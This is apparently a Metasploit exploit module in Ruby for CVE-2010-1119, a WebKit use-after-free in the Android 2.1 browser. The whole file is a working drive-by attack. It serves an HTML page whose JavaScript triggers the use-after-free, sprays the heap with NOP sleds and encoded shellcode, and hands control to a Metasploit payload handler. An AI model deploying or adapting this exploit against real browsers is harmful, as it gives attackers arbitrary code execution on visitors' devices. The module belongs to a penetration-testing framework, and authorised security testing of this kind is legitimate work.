
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WebKit Use-after-free Vulnerability',
			'Description'    => %q{
 					Use-after-free vulnerability in WebKit in Apple Safari before 5.0 on Mac OS X 10.5 
					through 10.6 and Windows, Safari before 4.1 on Mac OS X 10.4, and Safari on Apple 
					iPhone OS allows remote attackers to execute arbitrary code or cause a denial of 
					service (application crash), or read the SMS database or other data, via vectors 
					related to "attribute manipulation," as demonstrated by Vincenzo Iozzo and Ralf 
					Philipp Weinmann during a Pwn2Own competition at CanSecWest 2010.
				},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'marcel' ],
			'References'     => [ ['CVE', '2010-1119'] ],
			'Arch'           => ARCH_ARMLE,
			'Targets'        =>
				[
					[ 'Android 2.1-update1 emulator', 
					  	{
							'Platform'       => 'linux',
							'Arch'           => ARCH_ARMLE,
							'Ret'            => 0x00580058,
							'Offset'         => 0x00280028,
						}
					],
				],
			'DisclosureDate' => 'Mar 03 2011',
			'DefaultTarget'  => 0))

	end

	def on_request_uri(cli, request)
		enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))
		r0 = Rex::Text.to_unescape([target.ret].pack('V'), Rex::Arch.endian(target.arch))
		r2 = Rex::Text.to_unescape([target.ret + target['Offset'] ].pack('V'), Rex::Arch.endian(target.arch))

		html = <<-HTML
<html>
    <head>
        <script language="JavaScript">
            function heap() {
                var id = document.getElementById("target");
                var attribute = id.getAttributeNode('id');
                nodes = attribute.childNodes;
                document.body.removeChild(id);
                attribute.removeChild(nodes[0]);
                setTimeout(function () {
                        for (var i = 0; i < 70000; i++) {
                            var s = new String(unescape("#{r0}"));
                        };

                        var scode = unescape("#{r2}");
                        var nops = unescape("#{enc_nops}");
                        var shell = unescape("#{enc_code}");
                        do {
                            scode += scode;
                            nops += nops;
                        } while (scode.length <= 0x1000);
                        nops += shell
                        target = new Array();
                        for (i = 0; i < 300; i++) {
                            if (i < 130) 
                                target[i] = scode;
                            if (i > 130)
                                target[i] = nops;

                            document.write(target[i]);
                            document.write("<br />");
                            if (i > 250) {
                                alert("freeze");
                                nodes[0].textContent
                            }
                        }
                    }, 0);
            }
        </script>
    </head>
    <body onload=heap()>
        <p id=target></p>
    </body>
</html>
HTML

		print_status("Sending #{self.name}")
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		handler(cli)
	end
end
